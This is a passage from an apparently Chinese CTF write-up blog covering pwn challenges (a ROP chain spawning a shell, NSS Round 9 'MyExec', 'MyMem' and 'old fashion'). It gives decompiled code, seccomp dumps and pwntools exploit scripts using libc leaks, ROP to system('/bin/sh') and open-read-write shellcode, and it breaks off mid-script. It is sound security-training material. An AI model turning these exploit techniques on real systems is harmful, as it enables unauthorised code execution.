class="hljs-number">0x12</span>) <br>p.send(payload)<br><br>p.sendafter(<span class="hljs-string">b&quot;anything want to say?\n&quot;</span>,<span class="hljs-string">b&#x27;Korey0sh1&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">243</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elf_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x978</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;is &#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;elf_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(elf_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack_addr--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(stack_addr))<br><br>pause()<br><span class="hljs-comment">#-----------------------------3. ROP ------------------------------</span><br><span class="hljs-comment">#rsp = stack_add  + 0x140</span><br><span class="hljs-comment">#rbp = stack_addr + 0x240</span><br><br><span class="hljs-comment">#read(0, stack_add+ 0x110 , 0x100)</span><br><br><span class="hljs-comment">#call read: rsp -= 0x8</span><br><span class="hljs-comment">#rsp = stack_add  + 0x138</span><br><br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)) <br>pop_rdi = elf_base + <span class="hljs-number">0xa13</span><br>pop_rsi_r15 = elf_base + <span class="hljs-number">0xa11</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi) + p64(str_bin_sh) + p64(pop_rsi_r15) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)  + p64(sys_addr)<br>p.sendafter(<span class="hljs-string">b&quot;anything want to say?\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>







<h3 id="预期exp"><a href="#预期exp" class="headerlink" title="预期exp"></a>预期exp</h3><p>预期解思路：strtol控制rax，然后跳转到sys_write附近把elf_base和libc_base打出来</p>
<p>再布置ROP</p>
<p><strong>3.escape_langlang_mountain</strong></p>
<p>读一下把后门字符串写vnctf，write一次改command为cat flag，再读就能执行后门了</p>
<p>qemu</p>
<p><strong>4.hf</strong></p>
<p>提示：堆?</p>
<p><strong>5.鼠鼠的奇妙冒险</strong></p>
<p>提示：uaf in game.c&#x2F;fight()</p>
<p>​			ptmalloc2对线程数&gt;CPU核心数*8时会去lock之前的arena并复用； </p>
<p>​			线程结束时有tcache_thread_shutdown释放掉所有tcache chunks； </p>
<p>​			合理利用loadLevel调整堆结构；</p>
<h1 id="④NSS-Round-9"><a href="#④NSS-Round-9" class="headerlink" title="④NSS#Round 9"></a>④NSS#Round 9</h1><h2 id="1-MyExec"><a href="#1-MyExec" class="headerlink" title="1.MyExec"></a>1.MyExec</h2><h3 id="ptrcl"><a href="#ptrcl" class="headerlink" title="ptrcl"></a>ptrcl</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 函数原型</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>;<br><br><span class="hljs-comment">// option选项有很多，剩下的参数也由option确定，这里介绍两个主要的option</span><br><span class="hljs-comment">// PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)</span><br><br><span class="hljs-comment">// option为38的情况</span><br><span class="hljs-comment">// 此时第二个参数设置为1，则禁用execve系统调用且子进程一样受用</span><br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br><br><span class="hljs-comment">// option为22的情况</span><br><span class="hljs-comment">// 此时第二个参数为1，只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall</span><br><span class="hljs-comment">// 第二个参数为2，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则。</span><br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br></code></pre></td></tr></table></figure>





<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p><strong>沙箱</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">v1 = <span class="hljs-number">4</span>;<br>v2 = &amp;v3;<br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br></code></pre></td></tr></table></figure>

<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  sandbox();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;test NSS sandbox&quot;</span>);<br>  mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x50000</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">50</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)<span class="hljs-number">0x50000</span>, <span class="hljs-number">0x64</span>uLL);<br>  MEMORY[<span class="hljs-number">0x50000</span>]();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p><strong>直接往栈上搓shellcode，试试卓牛以前讲的，更换x86-64架构，进行pwn</strong></p>
<p><strong>retfq切换模式</strong></p>
<h3 id="exp1-切换模式"><a href="#exp1-切换模式" class="headerlink" title="exp1:切换模式"></a>exp1:切换模式</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>





<h3 id="exp2-ORW"><a href="#exp2-ORW" class="headerlink" title="exp2:ORW"></a>exp2:ORW</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.34.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./myexec&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>	p = process(banary)<br><span class="hljs-keyword">else</span>:<br>	p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br>	<br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------ ORW   ----------------------------</span><br>mmap_place = <span class="hljs-number">0x50000</span><br><br>payload = asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload += asm(shellcraft.read(<span class="hljs-number">3</span>, mmap_place+<span class="hljs-number">0x300</span>, <span class="hljs-number">0x300</span>))<br>payload += asm(shellcraft.write(<span class="hljs-number">1</span>, mmap_place+<span class="hljs-number">0x300</span>, <span class="hljs-number">0x300</span>))<br><br>sa(<span class="hljs-string">b&#x27;sandbox&#x27;</span>, payload)<br>    <br>pi()<br></code></pre></td></tr></table></figure>





<h2 id="2-MyMem"><a href="#2-MyMem" class="headerlink" title="2.MyMem"></a>2.MyMem</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p><strong>沙箱</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">v1 = <span class="hljs-number">6</span>;<br>v2 = &amp;v3;<br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br></code></pre></td></tr></table></figure>

<p>seccomp-tools </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">$ seccomp-tools dump ./mymem<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0004</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br><br></code></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  sandbox();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;test NSS sandbox&quot;</span>);<br>  mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x50000</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">50</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)<span class="hljs-number">0x50000</span>, <span class="hljs-number">0x64</span>uLL);<br>  MEMORY[<span class="hljs-number">0x50000</span>]();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>不能用更换x86-64架构，绕过orw，进行pwn</p>
<p>方法：</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.34.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./mymem&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>	p = process(banary)<br><span class="hljs-keyword">else</span>:<br>	p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br>	<br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------ ORW   ----------------------------</span><br>mmap_place = <span class="hljs-number">0x50000</span><br><br>payload = asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload += asm(shellcraft.read(<span class="hljs-number">3</span>, mmap_place+<span class="hljs-number">0x300</span>, <span class="hljs-number">0x100</span>))<br>payload += asm(shellcraft.write(<span class="hljs-number">1</span>, mmap_place+<span class="hljs-number">0x300</span>, <span class="hljs-number">0x100</span>))<br><br>sa(<span class="hljs-string">b&#x27;sandbox&#x27;</span>, payload)<br>    <br>pi()<br></code></pre></td></tr></table></figure>





<h2 id="3-old-fashion"><a href="#3-old-fashion" class="headerlink" title="3.old fashion"></a>3.old fashion</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p><strong>guess_number</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">guess_number</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-14h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v0 = time(<span class="hljs-number">0LL</span>);<br>  srand(v0);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">16</span>; ++i )<br>  &#123;<br>    v4 = rand() % <span class="hljs-number">100</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Guess the number (between 1 and 100): &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>    <span class="hljs-keyword">if</span> ( v4 == v2 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulations! You guessed the number correctly.&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sorry, the correct number is %d.\n&quot;</span>, v4);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>本来想用正确做法的，但是在调试中，随便选的数，也能过</strong></p>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)guess_number() == <span class="hljs-number">1</span> )<br>  &#123;<br>    yay();<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;difficult? Ok , i will give you a gift , how big gift you want ? &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;size);<br>    v4 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;here you are: %p\n&quot;</span>, v4);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;offset ? &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;i thint you may write /bin/sh here&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%zu&quot;</span>, &amp;v4[<span class="hljs-number">8</span> * size]); <span class="hljs-comment">//%zu输出size_t型,unsigned int</span><br>  &#125;<br>  _exit(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>可以负向写到exit，输入&#x2F;bin&#x2F;sh的数字形式</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="hljs-comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;</span><br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>banary = <span class="hljs-string">&quot;./zzzzz&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>	p = process(banary)<br><span class="hljs-keyword">else</span>:<br>	p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br>	<br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------ 1.number  ----------------------------</span><br>system = <span class="hljs-number">0x4013A6</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>	sla(<span class="hljs-string">b&#x27;Guess the number (between 1 and 100): &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br>size = <span 